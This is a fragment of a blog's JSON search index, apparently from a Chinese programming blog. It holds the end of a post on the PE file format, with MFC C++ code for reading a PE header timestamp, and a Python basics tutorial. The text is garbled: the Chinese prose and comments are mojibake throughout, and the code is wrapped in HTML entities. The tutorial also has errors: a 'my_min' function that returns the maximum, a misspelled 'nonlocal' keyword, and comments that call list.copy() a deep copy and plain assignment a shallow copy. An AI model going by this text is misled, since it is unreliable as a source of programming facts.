pHeader[i].Name);\n\t\t\tm_strEditName.SetString(name);\n\n\t\t\tUpdateData(FALSE);\n\t\t\treturn;\n\t\t&#125;\n\t&#125;\n\tMessageBox(L&quot;ä¸å­˜åœ¨è¯¥åœ°å€&quot;);\n&#125;\n\nå“åº”æ‹–æ‹½&#x2F;&#x2F;å“åº”æ–‡ä»¶æ‹–æ‹½\nvoid CPEDlg::OnDropFiles(HDROP hDropInfo)\n&#123;\n\n\t&#x2F;&#x2F; å­˜æ”¾æ–‡ä»¶è·¯å¾„\n\twchar_t filePath[MAX_PATH] &#x3D; &#123;&#125;;\n\n\t&#x2F;&#x2F; è·å–æ‹–æ‹½æ–‡ä»¶çš„è·¯å¾„\n\tDragQueryFile(hDropInfo, 0, filePath, MAX_PATH);\n\n\t&#x2F;&#x2F; æ›´æ–°å˜é‡\n\tm_strEditPath &#x3D; filePath;\n\tUpdateData(FALSE);\n\n\tCDialogEx::OnDropFiles(hDropInfo);\n&#125;\n\næ—¶é—´æ¢ç®—&#x2F;&#x2F;æ—¶é—´è½¬æ¢\nvoid CPEDlg::OnBnClickedButton3()\n&#123;\n\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)buf;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);\n\tPIMAGE_FILE_HEADER pFileHeader &#x3D; &amp;pNt-&gt;FileHeader;&#x2F;&#x2F;NTå¤´\n\t\n\tstruct tm* p;\n\n\ttime_t t &#x3D;pFileHeader-&gt;TimeDateStamp;\n\tp &#x3D; localtime(&amp;t);\n\tCString Time;\n\tTime.Format(L&quot;%då¹´%dæœˆ%dæ—¥%dæ—¶%dåˆ†%dç§’&quot;, 1900 + p-&gt;tm_year, 1 + p-&gt;tm_mon, p-&gt;tm_mday, p-&gt;tm_hour, p-&gt;tm_min, p-&gt;tm_sec);\n\tMessageBox(Time);\n&#125;\n\nPEæ–‡ä»¶ç»“æ„å›¾\n\n","slug":"PEæ–‡ä»¶ç»“æ„","date":"2020-11-24T06:55:09.000Z","categories_index":"Windowså®‰å…¨","tags_index":"PEæ–‡ä»¶ç»“æ„","author_index":"Akpigs"},{"id":"6b3d24a06c11d699c5c6879ddbf2363d","title":"pythonåŸºç¡€","content":"\n\n\n\n\n\n\n\n\næ—…è¡Œè€…,æœ¬ç ´ç«™ç‚¹æ—¨åœ¨åŸåˆ›æ–‡ç« è®°å½•å­¦ä¹ ç»å†&amp;&amp;æ”¶é›†ä¼˜ç§€èµ„æºå‡å°‘å­¦ä¹ æˆæœ¬ï¼Œå¦‚æœæ‚¨åˆæ›´å¥½çš„æƒ³æ³•è¯·è”ç³»æˆ‘ã€‚è®©æˆ‘ä»¬ä¸€èµ·ä¼ æ‰¿å¼€æºç²¾ç¥ğŸ¤“â€¦â€¦\næ•°å€¼ç±»å‹\n\n\nç±»å‹\nå…³é”®å­—\næ•°æ®\n\n\n\næ•´å‹\nint\næ•´æ•°ï¼Œæ— é™\n\n\næµ®ç‚¹å‹\nfloat\nå°æ•°\n\n\nå¤æ•°\ncomplex\nå¤æ•°ç”±å®æ•°éƒ¨åˆ†å’Œè™šæ•°éƒ¨åˆ†æ„æˆ\n\n\nå…³é”®å­—\n\n\nç®—æœ¯\nå¼•å…¥\nå¼‚å¸¸\næ§åˆ¶\næ“ä½œä¸çŠ¶æ€\nè¿”å›é€€å‡º\nå®šä¹‰\n\n\n\nand\nimport\nexcept\nwhile\ndel\nreturn\nlambda\n\n\nor\nas\ntry\nif\nassert\nyield\nclass\n\n\nin\nfrom\nfinally\nelse\nTrue\ncontinue\nglobal\n\n\nis\n\nraise\nelif\nFalse\npass\ndef\n\n\nnot\n\nwith\nfor\nNone\nbreak\nnonlacal\n\n\nåŸºç¡€æ“ä½œä¸ä½¿ç”¨è¾“å…¥Python\n# é€šè¿‡ input å¯ä»¥ç›´æ¥å®Œæˆä¸€ä¸ªäº¤äº’å¼çš„è¾“å…¥\nvalue &#x3D; input(&#39;è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°: &#39;)\n\n# è¾“å…¥çš„ä»»ä½•æ•°æ®æœ€ç»ˆéƒ½ä¼šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²\nprint(value, type(value))\n\n# é€šè¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢æˆ– eval å‡½æ•°å¯ä»¥è½¬æ¢ç±»å‹\nvalue &#x3D; int(input(&#39;è¯·è¾“å…¥ç¬¬äºŒä¸ªæ•°: &#39;))\nprint(value, type(value))\n\nè¾“å‡ºPython\n# ä½¿ç”¨ print è¿›è¡Œå†…å®¹çš„è¾“å‡ºï¼Œå¯ä»¥è¾“å‡ºä¸å®šé•¿åº¦ä¸å®šç±»å‹çš„å€¼\nprint(1, &#39;1&#39;, 1.1, [1, ], (1, ))\n\n# åœ¨ä½¿ç”¨ print è¿›è¡Œè¾“å‡ºçš„æ—¶å€™ï¼Œé€šè¿‡å‚æ•°å¯ä»¥æŒ‡å®šä¸€äº›æ ¼å¼\nprint(1, 2, 3, 4, 5, 6, sep&#x3D;&#39;*&#39;, end&#x3D;&#39;è¿™é‡Œæ˜¯ç»“å°¾&#39;)\n\n# æ ¼å¼åŒ–è¾“å‡ºï¼Œä½¿ç”¨ % è¿›è¡Œæ ¼å¼åŒ–è¾“å‡ºï¼Œå­—ç¬¦ä¸²è¯­æ³•æ”¯æŒ\nprint(&#39;%5.2f + %d &#x3D; %d&#39; % (1, 2, 1+2))\n\n# æ ¼å¼åŒ–è¾“å‡ºï¼Œä½¿ç”¨å­—ç¬¦ä¸²çš„å†…ç½®æ–¹æ³• formatï¼Œå­—ç¬¦ä¸²å†…ç½®æ–¹æ³•\nprint(&#39;&#123;0:.3f&#125;, &#123;1:10d&#125;, &#123;0:.3f&#125;&#39;.format(1, 2))\n\n# æ ¼å¼åŒ–è¾“å‡ºï¼Œä½¿ç”¨ f&#39;&#39; å­—ç¬¦ä¸²è¿›è¡Œè¾“å‡ºï¼Œè¯­æ³•æ”¯æŒ\nprint(f&#39;&#123;1:.2f&#125; + &#123;2&#125; &#x3D; &#123;1+2&#125;&#39;)\n\nå‡½æ•°çš„å®šä¹‰Python\n# å‡½æ•°å®šä¹‰çš„ç®€å•ä¾‹å­\ndef my_max(value1&#x3D;0, value2&#x3D;0):\n    # ç±»ä¼¼ä¸‰ç›®è¿ç®—ç¬¦çš„å†™æ³•\n    return value1 if value1 &gt; value2 else value2\n\n\n# æ–°çš„å†™æ³•ï¼Œå¯ä»¥é™åˆ¶ä¼ å…¥çš„ç±»å‹\ndef my_min(value1: int, value2: int) -&gt; int:\n    return value1 if value1 &gt; value2 else value2\n\n\n# pass ç±»ä¼¼äº C è¯­è¨€ä¸­çš„å•ä¸ªåˆ†å·ï¼Œå³ä»€ä¹ˆä¹Ÿä¸åšï¼Œå¦‚æœä¸€ä¸ª\n# å‡½æ•°æ²¡æœ‰æ˜¾ç¤ºçš„æŒ‡å®šè¿”å›å€¼ï¼Œé‚£ä¹ˆå°±è¿”å› None\ndef no_return():\n    pass\n\n\nprint(no_return())\n\n\n# å‚æ•°çš„ä¼ é€’: ä½ç½®ä¼ å‚ï¼ŒæŒ‰ç…§å®šä¹‰é¡ºåºä¼ å‚\nprint(my_min(10, 20))\n\n# å‚æ•°çš„ä¼ é€’: å…³é”®å­—ä¼ å‚ï¼ŒæŒ‰ç…§å½¢å‚åä¼ å‚(å¾ˆå¸¸è§)\nprint(my_min(value2&#x3D;10, value1&#x3D;20))\n\nè¿ç®—ç¬¦çš„ä½¿ç”¨Python\n# ç®—æ•°è¿ç®—ç¬¦: å¹‚è¿ç®— **\nprint(2 ** 1024)\n\n# ç®—æ•°è¿ç®—ç¬¦: é™¤æ³•è¿ç®— &#x2F;(çœŸé™¤æ³•) &#x2F;&#x2F;(å‘ä¸‹å–æ•´é™¤æ³•)\nprint(10 &#x2F; 10, 10.0 &#x2F; 3)\nprint(10 &#x2F;&#x2F; 3, -10.0 &#x2F;&#x2F; 3)\n\n# æ¯”è¾ƒè¿ç®— &#x3D;&#x3D; å’Œèº«ä»½è¿ç®—ç¬¦ is\nl1 &#x3D; [1, 2, 3]\nl2 &#x3D; l1\nprint(hex(id(l1)), hex(id(l2)), l1 &#x3D;&#x3D; l2, l1 is l2)\nl2 &#x3D; l1.copy()\nprint(hex(id(l1)), hex(id(l2)), l1 &#x3D;&#x3D; l2, l1 is l2)\n\n# æˆå‘˜å…³ç³»è¿ç®—ç¬¦: åˆ¤æ–­æŸå…ƒç´ æ˜¯å¦åœ¨æŸå®¹å™¨ä¸­\nprint(&#39;a&#39; in &#39;abc&#39;, &#39;d&#39; in &#39;abc&#39;)\n\né€‰æ‹©ç»“æ„Python\n# åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦ç¬¦åˆé•¿åº¦ä¸”åŒ¹é…\n\n# æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥\nusername &#x3D; input(&#39;username: &#39;)\npassword &#x3D; input(&#39;password: &#39;)\n\n# åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„é•¿åº¦æ˜¯å¦å‡†ç¡®\nif len(username) &gt;&#x3D; 8 and len(password) &gt;&#x3D; 8:\n    # if åé¢ç›´æ¥æ·»åŠ è¡¨è¾¾å¼ï¼Œç»“å°¾å¿…é¡»æ·»åŠ å†’å·(:)\n    if username &#x3D;&#x3D; &#39;username&#39; and password &#x3D;&#x3D; &#39;password&#39;:\n        # if åé¢çš„è¯­å¥å¿…é¡»æ‹¥æœ‰ä¸€çº§ç¼©è¿›ï¼Œå¹¶ä¸”æ‰€æœ‰å­˜åœ¨ä¸€çº§ç¼©è¿›\n        # çš„è¯­å¥éƒ½è¢«è®¤ä¸ºæ˜¯è¯­å¥å—çš„ä¸€éƒ¨åˆ†ï¼Œç´¯å“¦å››èŠ±æ‹¬å·ä½œç”¨åŸŸ\n        print(&#39;ç™»å½•æˆåŠŸï¼Œè·³è½¬è‡³ä¸ªäººä¸­å¿ƒ...&#39;)\n        print(&#39;è¿™é‡Œæ˜¯ç¬¬äºŒæ¡è¯­å¥ï¼ŒåŒæ ·æ˜¯è¾“å‡ºçš„&#39;)\nelse:\n    print(&#39;ç”¨æˆ·åæˆ–å¯†ç çš„é•¿åº¦ä¸å¤Ÿ&#39;)\n\nåˆ—è¡¨Python\n# åˆ—è¡¨çš„åŸºç¡€çŸ¥è¯†: å†…ç½®çš„åºåˆ—ç±»å‹ï¼Œå¯ä»¥çœ‹ä½œæ˜¯åŠ å¼ºç‰ˆæœ¬çš„æ•°ï¼Œé€šè¿‡ä¸­æ‹¬å·\n# [] è¿›è¡Œå®šä¹‰ï¼Œå…¶ä¸­ä¸è¦æ±‚å…ƒç´ çš„ç±»å‹æ˜¯ä¸€è‡´çš„ï¼Œå¹¶ä¸”é•¿åº¦æ˜¯å¯å˜çš„\nprint([1, 2, 3, 4, 5], type([]))\nprint([1, 1.1, &#39;1&#39;, [1]])\n\n# ç®—æ•°è¿ç®—\nprint([1] + [2])        # å°†å‚ä¸è¿ç®—çš„åˆ—è¡¨ç»„åˆæˆæ–°çš„åˆ—è¡¨\nprint([1, 2] * 3)       # å°†åˆ—è¡¨çš„å…ƒç´ é‡å¤ 3 æ¬¡\nprint(3 in [0, 1, 2])   # åˆ¤æ–­æ˜¯å¦åœ¨åˆ—è¡¨ä¸­\nprint([1, 2, 3] &#x3D;&#x3D; [3, 2, 1])   # æ¯”è¾ƒè¿ç®—ç¬¦\n\n# å…¨å±€å‡½æ•°\nprint(len([1, 2, 3]))\nprint(min([1, 2, 3]))\nprint(max([1, 2, 3]))\nprint(list(reversed([1, 2, 3])))\nprint(list(sorted([1, 2, 3])))\n\n# å†…ç½®æ–¹æ³•\nl &#x3D; [1, 2, 3, 4, 5]\nl.append(6)\nprint(l)        # åœ¨ç»“å°¾æ·»åŠ å…ƒç´ \nl.insert(0, 0)\nprint(l)        # åœ¨æŒ‡å®šä½ç½®æ·»åŠ \nl.remove(3)\nprint(l)        # åˆ é™¤æŸå…ƒç´ (å…ƒç´ )\nl.pop(0)\nprint(l)        # åˆ é™¤æŸå…ƒç´ (ç´¢å¼•)ï¼Œè¿”å›åˆ é™¤çš„å†…å®¹\nl.extend([1,2,3,4])\nprint(l)        # ç±»ä¼¼åˆ—è¡¨çš„åŠ æ³•è¿ç®—ç¬¦\n\n# åˆ‡ç‰‡æ“ä½œ(åºåˆ—æ“ä½œ)  l[a:b:c]\nl &#x3D; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nprint(l[:3], l[:4])         # [èµ·å§‹ä½ç½®, ç»“æŸçš„ç´¢å¼•(ä¸åŒ…å«)]\nprint(l[3:], l[4:])         # [èµ·å§‹çš„ç´¢å¼•(åŒ…å«), ç»“æŸä½ç½®]\nprint(l[::2], l[::3])       # [::é—´éš”çš„ä¸ªæ•°(æ­¥é•¿)]\nprint(l[:-1])               # [:è´Ÿæ•°] å€’æ•°ç¬¬nä¸ªçš„å‰ä¸€ä¸ª\nprint(l[::-1])              # [::è´Ÿæ•°] é€†åºå¼€å§‹è®¡ç®—æ­¥æ•°\nprint(l[1:7:3])             # ä»ä¸‹æ ‡ 1 å¼€å§‹ï¼Œåˆ°ä¸‹æ ‡ 7 çš„å‰ä¸€ä¸ªï¼Œæ¯æ¬¡éå†+3\n\n# å…ƒç»„ç±»å‹: å¯ä»¥çœ‹ä½œä¸å˜çš„åˆ—è¡¨ï¼Œæ“ä½œæ–¹å¼ç±»ä¼¼åˆ—è¡¨ï¼Œä½¿ç”¨ , å®šä¹‰\nprint((1,), type((1,)))\n\n# å…ƒç»„çš„æ‰“åŒ…å’Œè§£åŒ…(æ‰“åŒ…)\nt &#x3D; 1, 2, 3, 4, 5\n# å…ƒç»„çš„æ‰“åŒ…å’Œè§£åŒ…(è§£åŒ…): è§£åŒ…çš„è¿‡ç¨‹ä¸­å‰é¢çš„å˜é‡æ•°é‡å’Œå…ƒç»„çš„å…ƒç´ æ•°é‡å¿…é¡»ä¿æŒä¸€è‡´\na, b, c, d, e &#x3D; t\n\n# å…ƒç»„æ‰“åŒ…è§£åŒ…çš„ä¾‹å­\na &#x3D; 1\nb &#x3D; 2\n# å°† b å’Œ a çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ 2 å’Œ 1 æ‰“åŒ…æˆä¸€ä¸ªä¸´æ—¶çš„å…ƒç»„ï¼Œ\n# ç„¶åè¿›è¡Œè§£åŒ…ï¼Œå°† 2 å’Œ 1 åˆ†åˆ«èµ‹å€¼ç»™å¯¹åº”ä½ç½®çš„ a å’Œ b\na, b &#x3D; b, a\n\n\n# æ‰“åŒ…å¯ä»¥è®©å‡½æ•°è¿”å›å¤šä¸ªå‚æ•°ï¼Œè§£åŒ…å¯ä»¥æ¥æ”¶å¤šä¸ªå‚æ•°\ndef return_more():\n    return 1, 2, 3\n\n\n# é€šè¿‡è§£åŒ…æ¥æ”¶åˆ°äº†å¤šä¸ªè¿”å›å€¼\nvalue1, value2, value3 &#x3D; return_more()\n\nå­—å…¸Python\n# å­—å…¸å­˜å‚¨çš„æ˜¯é”®å€¼å¯¹ï¼Œå¯ä»¥é€šè¿‡ &#123;&#125;çš„æ–¹å¼å®šä¹‰å­—å…¸\nprint(&#123;&#39;1&#39;: 1, &#39;2&#39;: 2, &#39;3&#39;: 3&#125;, &#123;&#125;)\n\nd &#x3D; dict()\n# é€šè¿‡ç´¢å¼•æ·»åŠ é”®æ¥è®¿é—®å¯¹åº”çš„å€¼ï¼Œç¬¬ä¸€æ¬¡èµ‹å€¼æ—¶ä¼šæ·»åŠ ï¼Œæ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯ä¿®æ”¹\nd[&#39;å°æ˜&#39;] &#x3D; 99\nprint(d)            # æ·»åŠ \nd[&#39;å°æ˜&#39;] &#x3D; 0\nprint(d)            # ä¿®æ”¹\ndel d[&#39;å°æ˜&#39;]\nprint(d)            # åˆ é™¤\n\n# ä¸èƒ½è®¿é—®ä¸å­˜åœ¨çš„é”®ï¼Œåœ¨ä½¿ç”¨å‰é€šå¸¸ä¼šåˆ¤æ–­æ˜¯å¦æ‹¥æœ‰é”®\nif &#39;å°æ˜&#39; in d:\n    print(d[&#39;å°æ˜&#39;])\n\n# å¯å˜ç±»å‹ï¼Œå…ƒç´ å¯ä»¥è¢«ä¿®æ”¹çš„ç±»å‹: list dict set\n# ä¸å¯å˜ç±»å‹ï¼Œå…ƒç´ ä¸å¯ä»¥è¢«ä¿®æ”¹çš„ç±»å‹: int float bool str tuple\n\n# å­—å…¸çš„é”®å¿…é¡»æ—¶ä¸å¯å˜ç±»å‹\nd &#x3D; &#123;1: 1, &#39;1&#39;: 1, True: 1, 1.1: 1, (1,): 1&#125;\n\n# ç”¨äºè·å–åˆ°å­—å…¸å†…çš„ä¸€äº›ä¿¡æ¯\nprint(d.items())\nprint(d.values())\nprint(d.keys())\n\n\n# é›†åˆç±»å‹: é€šè¿‡ &#123;å€¼ï¼Œå€¼ï¼Œå€¼&#125; å®šä¹‰éç©ºé›†åˆï¼Œç©ºé›†åˆä½¿ç”¨set()å®šä¹‰\n#   set è¦æ±‚æ‰€æœ‰çš„æ•°æ®å¿…é¡»æ—¶å¸¸é‡ï¼Œä¸”å”¯ä¸€\nprint(&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 8, 7, 6, 5, 4, 3, 2, 1&#125;)\n\n# å¯ä»¥é€šè¿‡é›†åˆæ¥ä¿å­˜ä¸€äº›å”¯ä¸€çš„æ•°æ®\nprint(list(set([1, 2, 3, 4, 5, 6, 7, 8])))\n\n# é›†åˆå¯ä»¥ç”¨äºæ‰§è¡Œæ•°å­¦è¿ç®—ä¸­çš„é›†åˆè¿ç®—   | ^ - +\n\næ·±æ‹·è´ä¸æµ…æ‹·è´Python\nl1 &#x3D; [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n# å¯¹åˆ—è¡¨è¿›è¡Œèµ‹å€¼æ“ä½œï¼Œæ‰§è¡Œçš„å®é™…æ˜¯æµ…æ‹·è´\nl2 &#x3D; l1\nprint(hex(id(l1)), hex(id(l2)))\n\n# å¦‚æœæ˜¯æµ…æ‹·è´ï¼Œä¸¤ä¸ªå˜é‡æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œä¸€æ–¹æ›´æ”¹ï¼Œå¦ä¸€æ–¹ä¹Ÿå—å½±å“\nl2[0] &#x3D; 10\nprint(l1, l2)\n\nl1 &#x3D; [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n# é€šè¿‡ copy æ–¹æ³•è¿›è¡Œæ·±æ‹·è´\nl2 &#x3D; l1.copy()\nprint(hex(id(l1)), hex(id(l2)))\n\n# æ‹¥æœ‰å„è‡ªç‹¬ç«‹çš„ç©ºé—´ï¼Œä¸ä¼šå½±å“å¦å¤–ä¸€ä¸ª\nl2[0] &#x3D; 10\nprint(l1, l2)\n\n\n# åŠ¨æ€ç±»å‹: ç±»å‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ç¡®å®šï¼Œå¯ä»¥æ”¹å˜ï¼Œä¸€èˆ¬ä¸ç”¨åœ¨å®šä¹‰(å¦‚æœæœ‰å®šä¹‰)æ—¶æŒ‡å®šç±»å‹\n# é™æ€ç±»å‹: ç±»å‹åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œè¿è¡ŒæœŸé—´ä¸å˜ï¼Œå§‹ç»ˆä¿å­˜å®šä¹‰æ—¶æ‰€æä¾›çš„ç±»å‹\n\n# å¼ºç±»å‹ï¼š ä¸åŒç±»å‹çš„å˜é‡ï¼Œæ‰€èƒ½å¤Ÿæ‰§è¡Œçš„æ“ä½œæ˜¯ä¸åŒçš„ï¼Œä¾‹å¦‚æ•´æ•°ç›¸ä¹˜æ˜¯ä¹˜æ³•ï¼Œå­—ç¬¦ä¸²ä¹˜æ³•æ˜¯é‡å¤\n# å¼±ç±»å‹ï¼š è¿ç®—ä¸è€ƒè™‘ç±»å‹ï¼Œå¯ä»¥ä¸ºä»»ä½•ç±»å‹æä¾›è®¡ç®—\n\nwhileå¾ªç¯Python\n# å¾ªç¯ï¼Œä½¿ç”¨ while ç¼–å†™å¾ªç¯è¯­å¥ï¼Œå’Œ C ç›¸åŒ\n\nnumber &#x3D; 1\nwhile number &lt;&#x3D; 100:\n    print(number, end&#x3D;&#39; &#39;)\n    number +&#x3D; 1\nprint(&#39;&#39;)\n\n# for è¯­å¥çš„ä½¿ç”¨: å¯ä»¥ç”¨äºéå†æ‰€æœ‰çš„å¯è¿­ä»£ç±»å‹ï¼Œæ¯æ¬¡å¾ªç¯ä»åºåˆ—ä¸­è·å–ç¬¬(å¾ªç¯æ¬¡æ•°)ä¸ªçš„å…ƒç´ ï¼Œ\n# å°†å…ƒç´ èµ‹å€¼ç»™ for å’Œ in ä¸­é—´æ‰€æä¾›çš„å˜é‡ä¸­ï¼Œå¯ä»¥è¢«ç›´æ¥çš„è®¿é—®åˆ°\nfor letter in &#39;hello 15pb&#39;:\n    print(letter)\n\n# ä½¿ç”¨ range å¯ä»¥å¿«é€Ÿç”Ÿæˆä¸€ä¸ªæŒ‡å®šè§„åˆ™çš„åˆ—è¡¨ï¼Œå‚æ•°åŒåˆ‡ç‰‡\nprint(list(range(1, 100, 3)))\n\n# é€šè¿‡ range ç”Ÿæˆä¸€ä¸ªå¯è¿­ä»£åºåˆ—ï¼Œä»ä¸­å–å‡ºå…ƒç´ ï¼Œå¹¶è¾“å‡º\nfor value in range(101):\n    print(value)\n\n\n# while ä¸€èˆ¬ç”¨äºä¸ç¡®å®šçš„å¾ªç¯ï¼Œfor ä¸€èˆ¬ç”¨äºåºåˆ—çš„éå†\n# break å’Œ continue å’Œ C++ çš„å®Œå…¨ä¸€è‡´ï¼Œå¯¹äºbreakï¼Œfor å’Œ while æœ‰æ‰©å±•è¯­æ³•\n\nfor i in range(100):\n    # å¯¹äº for else æˆ–è€… while else è¯­å¥ï¼Œå¦‚æœé‡‡ç”¨ break è·³å‡º\n    # å¾ªç¯å°±ä¸æ‰§è¡Œ elseï¼Œå¦‚æœæ­£å¸¸é€€å‡ºåˆ™æ‰§è¡Œ\n    pass\nelse:\n    print(&#39;æ­£å¸¸é€€å‡º&#39;)\n\nforå¾ªç¯Python\nl &#x3D; [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n# ä½¿ç”¨ for éå†çš„å‡ ç§æ–¹å¼: å€¼çš„éå†\nfor item in l:\n    print(item, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# ä½¿ç”¨ä¸‹æ ‡çš„æ–¹å¼è¿›è¡Œéå†\nfor index in range(len(l)):\n    print(f&#39;l[&#123;index&#125;]&#x3D;&#123;l[index]&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# é€šè¿‡æšä¸¾çš„æ–¹å¼è¿›è¡Œç´¢å¼•\nfor index, item in enumerate(l):\n    print(f&#39;l[&#123;index&#125;]&#x3D;&#123;item&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\nd &#x3D; &#123;&#39;å°æ˜&#39;: 100, &quot;å°çº¢&quot;: 101, &#39;å°åˆš&#39;: 99&#125;\n\n# å­—å…¸çš„éå†æ–¹å¼: é”®ï¼Œé»˜è®¤ä½¿ç”¨å­—å…¸åå°±æ˜¯ keys\nfor key in d.keys():\n    print(f&#39;d[&#123;key&#125;]&#x3D;&#123;d[key]&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# å­—å…¸çš„éå†æ–¹å¼: å€¼\nfor value in d.values():\n    print(f&#39;&#123;value&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# å­—å…¸çš„éå†æ–¹å¼: é”®å€¼å¯¹\nfor key, value in d.items():\n    print(f&#39;d[&#123;key&#125;]&#x3D;&#123;value&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\nç”Ÿæˆå¼Python\n# åˆ—è¡¨ç”Ÿæˆå¼: å¿«é€Ÿç”Ÿæˆåˆ—è¡¨\nprint([i for i in range(1000)])                         # ç”ŸæˆæŒ‡å®šåºåˆ—\nprint([i for i in range(1000) if i % 2 &#x3D;&#x3D; 0])           # ç”ŸæˆæŒ‡å®šåºåˆ— + åˆ¤æ–­\nprint([i**2 for i in range(1000) if i % 2 &#x3D;&#x3D; 0])        # ç”ŸæˆæŒ‡å®šåºåˆ— + åˆ¤æ–­ + è¡¨è¾¾å¼\nprint([i*j for i in range(1, 10) for j in range(1, 10)])\n\nimport os\ndir_base &#x3D; r&#39;D:\\Microsoft\\Visual Studio 2019\\Common7\\IDE\\\\&#39;\nprint([os.path.splitext(path) for path in os.listdir(dir_base) if os.path.isfile(dir_base+path)])\n\n# å…ƒç»„ç”Ÿæˆå¼ï¼Œæ”¹æˆåœ†æ‹¬å·\n# å­—å…¸ç”Ÿæˆå¼ï¼Œæ”¹æˆé”®å€¼å¯¹çš„èŠ±æ‹¬å·\n# é›†åˆç”Ÿæˆå¼ï¼Œæ”¹æˆèŠ±æ‹¬å·\n\nglobalå…³é”®å­—Python\n# å…¨å±€å˜é‡: å®šä¹‰åœ¨æ‰€æœ‰å‡½æ•°ä¹‹å¤–çš„å˜é‡\ng_number &#x3D; 0\n\n\n# å±€éƒ¨å˜é‡: å®šä¹‰åœ¨ä»»ä½•ä¸€ä¸ªå‡½æ•°ä¹‹å†…çš„å˜é‡\ndef function1():\n    l_number &#x3D; 1\n    # åˆ†åˆ«ç”¨äºè¾“å‡ºå½“å‰çš„å…¨å±€å˜é‡ä»¥åŠæ‰€åœ¨ä½œç”¨åŸŸçš„å±€éƒ¨å˜é‡\n    print(globals(), locals())\n\n\nfunction1()\n\n\n# å°è¯•åœ¨å‡½æ•°ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡\ndef function2():\n    # åœ¨å±€éƒ¨ç©ºé—´ä¸­å¯ä»¥ç›´æ¥è®¿é—®å…¨å±€å˜é‡\n    print(g_number)\n\n\nfunction2()\n\n\ndef function3():\n    # ä¸€æ—¦å°è¯•åœ¨å‡½æ•°å†…ä¿®æ”¹å…¨å±€å˜é‡ï¼Œå®é™…ä¸Šä¼šå®šä¹‰å‡ºä¸€ä¸ª\n    # å’Œå…¨å±€å˜é‡åŒåçš„å±€éƒ¨å˜é‡\n    g_number &#x3D; 10000\n    print(locals(), globals())\n\n\nfunction3()\n\n\ndef function4():\n    # é€šè¿‡ global å…³é”®å­—ï¼Œå¯ä»¥å£°æ˜ä½¿ç”¨çš„æ˜¯å…¨å±€èŒƒå›´å†…çš„ g_number\n    global g_number\n    g_number &#x3D; 100000000\n    print(locals(), globals())\n\n\nfunction4()\n\n\ndef function5():\n    # å¦‚æœæƒ³åœ¨å‡½æ•°å†…å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ global\n    global g_value2\n    g_value2 &#x3D; 0x12345\n    print(locals(), globals())\n\n\nfunction5()\n\næ¨¡å—Python\n# ä»»ä½•ä¸€ä¸ªä»¥ .py ç»“å°¾çš„æ–‡ä»¶ï¼Œéƒ½è¢«æˆä¸ºæ¨¡å—ï¼Œå¯ä»¥ä½¿ç”¨ import è¯­å¥å¯¼å…¥\n# å¯¼å…¥çš„æ—¶å€™é¦–å…ˆéœ€è¦æ‰¾åˆ°ç›®æ ‡æ¨¡å—ï¼Œæ¥ä¸‹æ¥å°†ç›®æ ‡æ¨¡å—è½¬æ¢æˆå­—èŠ‚ç ï¼Œä½¿ç”¨\n# PVMæ‰§è¡Œå­—èŠ‚ç ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªååˆ†æ¶ˆè€—æ€§èƒ½çš„äº‹æƒ…ï¼Œæ‰€ä»¥ python åªå…è®¸\n# æˆ‘ä»¬å¯¹ä¸€ä¸ªæ¨¡å—ç›´æ¥è¿›è¡Œä¸€æ¬¡å¯¼å…¥\nimport module\nimport module\n\n# å¦‚æœä¸€å®šæƒ³è¦ä»£ç è¢«æ‰§è¡Œå¤šéï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®æ¨¡å— importlib\nimport importlib\nimportlib.reload(module)\n\n# å¦‚ä½•ä½¿ç”¨æ¨¡å—ä¸­çš„å†…å®¹ï¼ˆæ¦‚å¿µç±»ä¼¼C++ä¸­çš„å¤´æ–‡ä»¶å’Œå‘½åç©ºé—´ï¼‰\nimport module                       # ç±»ä¼¼äº #include &lt;iostream&gt;\nprint(module.module_value1)\n\nfrom module import module_value2    # ç±»ä¼¼äºåœ¨åŒ…å«å¤´æ–‡ä»¶çš„åŸºç¡€ä¸Š using std::name\nprint(module_value2)\n\nfrom module import *                # åœ¨åŒ…å«å¤´æ–‡ä»¶çš„åŸºç¡€ä¸Š using namespace std\nprint(module_value3)\n\n# å•ä¸‹åˆ’çº¿å¼€å¤´çš„æ¨¡å—å…¨å±€å˜é‡åªèƒ½ä½¿ç”¨å‘½åç©ºé—´è®¿é—®\nprint(module._module_private_value)\n\nç±»çš„å®šä¹‰Python\n# class å¼€å¤´åé¢ç´§è·Ÿç±»åï¼Œç±»åçš„é¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œåé¢çš„æ‹¬å·ä¸­æ˜¯çˆ¶ç±»\n# python3 å®šä¹‰çš„ç±»ç§°ä¹‹ä¸ºæ–°å¼ç±»ï¼Œæ— è®ºæ˜¯å¦æ˜¾å¼è¯´æ˜çˆ¶ç±»çš„ objectï¼Œé»˜\n# 